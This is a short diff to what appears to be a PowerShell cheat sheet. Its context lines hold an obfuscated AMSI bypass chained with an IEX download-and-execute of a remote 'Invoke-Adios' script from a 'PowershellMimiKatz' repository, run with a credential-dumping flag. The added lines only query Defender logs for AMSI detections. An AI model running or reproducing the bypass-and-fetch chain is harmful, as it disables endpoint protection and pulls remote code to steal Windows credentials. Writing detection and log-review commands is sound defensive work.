@@ -28,3 +28,10 @@ powershell -version 2 -Command [Ref].Assembly.GetType('System.Management.Automat
 powershell -version 2 -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/PowershellMimiKatz/master/Invoke-Adios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Adios -AdiosCreds')
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+To Check AMSI Log:
+
+Get-MpThreatDetection | Sort InitialDetectionTime -Descending | select -First 1
+Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
